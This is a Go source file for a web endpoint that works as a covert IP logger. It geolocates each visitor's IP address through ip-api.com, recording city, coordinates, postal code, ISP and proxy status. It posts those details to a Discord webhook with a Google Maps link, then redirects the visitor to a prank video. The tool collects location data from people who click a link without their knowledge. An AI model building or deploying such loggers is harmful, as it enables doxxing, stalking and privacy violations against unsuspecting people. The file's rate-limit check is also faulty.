package endpoints

import (
	"baxt-api/internal/discord"
	"baxt-api/internal/endpoint"
	"baxt-api/internal/env"
	"baxt-api/internal/utils"
	"encoding/json"
	"fmt"
	"github.com/gofiber/fiber/v2"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

var IpEndpoint = endpoint.Endpoint{
	Method: fiber.MethodGet,
	Url:    "/ip",
	Handler: func(ctx *fiber.Ctx) error {
		if os.Getenv("IP_API_RATE_LIMIT") != "" {
			secondsToWait, err := time.ParseDuration(os.Getenv("IP_API_RATE_LIMIT") + "s")
			if err != nil {
				ctx.Response().SetStatusCode(fiber.StatusInternalServerError)
				return ctx.JSON(fiber.Map{
					"success": false,
					"message": "Error while parsing the rate limit",
				})
			}

			if time.Now().Before(time.Now().Add(secondsToWait)) {
				ctx.Response().SetStatusCode(fiber.StatusTooManyRequests)
				return ctx.JSON(fiber.Map{
					"success": false,
					"message": "We are being rate limited, please try again later",
				})
			}

			err = os.Unsetenv("IP_API_RATE_LIMIT")
			if err != nil {
				ctx.Response().SetStatusCode(fiber.StatusInternalServerError)
				return ctx.JSON(fiber.Map{
					"success": false,
					"message": "Error while setting the rate limit",
				})
			}
		}

		// Get ip
		ip, _, err := net.SplitHostPort(ctx.Context().RemoteAddr().String())
		// If the IP is 0.0.0.0, use Cloudflare IP for testing
		if ip == "127.0.0.1" || ip == "0.0.0.0" {
			ip = "1.1.1.1"
		}
		if err != nil {
			ctx.Response().SetStatusCode(fiber.StatusInternalServerError)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "Error while getting the IP",
			})
		}

		// Get ip info
		res, err := http.Get("http://ip-api.com/json/" + ip + "?fields=51638267")
		if err != nil || res.StatusCode != 200 {
			ctx.Response().SetStatusCode(fiber.StatusBadGateway)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "Error while making the request to the IP Whois API",
			})
		}

		if res.Header.Get("X-Rl") == "0" {
			err := os.Setenv("IP_API_RATE_LIMIT", res.Header.Get("X-Ttl"))
			if err != nil {
				ctx.Response().SetStatusCode(fiber.StatusInternalServerError)
				return ctx.JSON(fiber.Map{
					"success": false,
					"message": "Error while setting the rate limit",
				})
			}
		}

		defer utils.HandleBody(res.Body)

		// Response (json) -> struct
		var data Whois
		err = json.NewDecoder(res.Body).Decode(&data)
		if err != nil {
			ctx.Response().SetStatusCode(fiber.StatusInternalServerError)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "Error while decoding the response from the IP Whois API",
			})
		}

		// Sometimes the API returns a 200 but the response is an error
		if data.Status != "success" {
			ctx.Response().SetStatusCode(fiber.StatusBadGateway)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "The IP Whois API returned an error",
				"error":   data.Message,
			})
		}

		mainField := fmt.Sprintf(
			"**IP:** %s\n**Mobile:** %t\n**Proxy:** %t\n**Hosting:** %t",
			data.Query, data.Mobile, data.Proxy, data.Hosting,
		)

		locationField := fmt.Sprintf(
			"**Continent:** %s\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Latitude:** %v\n**Longitude:** %v\n**Postal:** %s",
			data.Continent, data.Country, strings.ToLower(data.CountryCode), data.RegionName, data.City, data.Latitude, data.Longitude, data.Postal,
		)

		connectionField := fmt.Sprintf(
			"**AS:** %v\n**Organization:** %s\n**ISP:** %s",
			data.As, data.Org, data.ISP,
		)

		timezoneFiled := fmt.Sprintf(
			"**ID:** %s\n**Offset:** %v",
			data.Timezone, data.Offset,
		)

		embed := discord.Embed{
			Title:       "__IP Logger__",
			Description: "From: " + ctx.BaseURL(),
			Thumbnail: discord.Thumbnail{
				URL: env.AvatarURL,
			},
			Color: 13346551,
			Fields: []discord.Field{
				{
					Name:  ":zap: **Main**",
					Value: mainField,
				},
				{
					Name:  ":earth_americas: **Location**",
					Value: locationField,
				},
				{
					Name:  ":satellite: **Connection**",
					Value: connectionField,
				},
				{
					Name:  ":clock1: **Timezone**",
					Value: timezoneFiled,
				},
			},
		}

		button := discord.ComponentRow{
			Type: discord.ActionRowType,
			Components: []discord.Component{{
				Type:  discord.ButtonType,
				Style: discord.ButtonStyleLink,
				Label: "Open location in Google Maps",
				Url:   fmt.Sprintf("https://www.google.com/maps/search/%v,%v", data.Latitude, data.Longitude),
			}},
		}

		webhook := discord.Webhook{
			Username:   "IP Logger",
			AvatarURL:  env.AvatarURL,
			Embeds:     []discord.Embed{embed},
			Components: []discord.ComponentRow{button},
		}

		// Webhook (struct) -> json
		body, err := json.Marshal(webhook)
		if err != nil {
			ctx.Response().SetStatusCode(fiber.StatusInternalServerError)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "Error while encoding the webhook",
			})
		}

		// Send the webhook
		res, err = http.Post(env.LoggerWebhook, fiber.MIMEApplicationJSON, strings.NewReader(string(body)))
		if err != nil || res.StatusCode != 204 {
			ctx.Response().SetStatusCode(fiber.StatusBadGateway)
			return ctx.JSON(fiber.Map{
				"success": false,
				"message": "Error while sending the webhook",
			})
		}

		defer utils.HandleBody(res.Body)

		// Yes, that is what you think it is
		return ctx.Redirect("https://youtu.be/dQw4w9WgXcQ", fiber.StatusSeeOther)
	},
}

type Whois struct {
	Status      string  `json:"status"`
	Message     string  `json:"message"`
	Continent   string  `json:"continent"`
	Country     string  `json:"country"`
	CountryCode string  `json:"countryCode"`
	RegionName  string  `json:"regionName"`
	City        string  `json:"city"`
	Postal      string  `json:"zip"`
	Latitude    float32 `json:"lat"`
	Longitude   float32 `json:"lon"`
	Timezone    string  `json:"timezone"`
	Offset      int     `json:"offset"`
	ISP         string  `json:"isp"`
	Org         string  `json:"org"`
	As          string  `json:"as"`
	Mobile      bool    `json:"mobile"`
	Proxy       bool    `json:"proxy"`
	Hosting     bool    `json:"hosting"`
	Query       string  `json:"query"`
}
